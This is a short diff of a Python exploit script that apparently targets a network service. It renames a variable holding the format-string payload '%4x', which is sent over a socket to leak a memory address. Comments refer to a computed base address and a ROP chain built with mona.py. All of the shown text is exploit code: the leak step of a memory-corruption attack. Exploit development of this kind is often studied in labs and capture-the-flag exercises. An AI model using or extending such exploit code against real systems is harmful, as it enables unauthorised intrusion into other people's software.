@@ -10,7 +10,7 @@ import struct
 # base address is 0x436b20a0 - 0x20a0 = 436b0000
 # rop chain generated with mona.py - www.corelan.be
 
-buffer_1="%4x"
+leak_format_string="%4x"
 
 
 expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
@@ -21,7 +21,7 @@ print("Leaking Address")
 #print(x)
 
 # send input_1
-expl.send(buffer_1)
+expl.send(leak_format_string)
 # read back line 2 sent from server
 x = expl.recv(1024)
 # leaking address
